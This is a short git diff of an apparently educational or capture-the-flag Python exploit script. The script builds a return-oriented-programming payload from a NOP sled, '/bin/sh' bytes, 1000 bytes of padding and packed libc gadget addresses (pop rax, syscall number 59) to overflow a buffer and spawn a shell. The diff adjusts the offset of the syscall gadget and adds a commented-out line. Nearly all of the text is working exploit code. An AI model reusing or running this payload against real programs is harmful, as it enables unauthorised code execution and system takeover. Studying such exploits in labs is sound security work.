@@ -22,13 +22,14 @@ d6 = 0x2f62696e2f2f7368 #/bin//sh
 d7 = 0x00
 retString = 0x7fffffffe154
 g5 = LIBC_OFFSET + 0x177452 + 0x3 #push rsp
-g6 = LIBC_OFFSET + 0x132bae #syscall +0xe
+g6 = LIBC_OFFSET + 0x132bae +0xe #syscall +0xe
 
 # removed 0x1f940  from all of mine. It was given by gadgets.py as offset but seems to link to a non executable part of the library...
 shellcode =''
 for i in range(1,36) :
     shellcode += '\x90'
 shellcode += '\x20\x1d\x2f\x62\x69\x6e\x2f\x73\x68\x20\x1d\x2c\x30'
+# shellcode += struct.pack('<p',"'/bin/sh',0")
 shellcode += 'A'*(1000)
 shellcode += struct.pack('<q', g1)#pop rax ; ret
 shellcode += struct.pack('<q', d1) #59
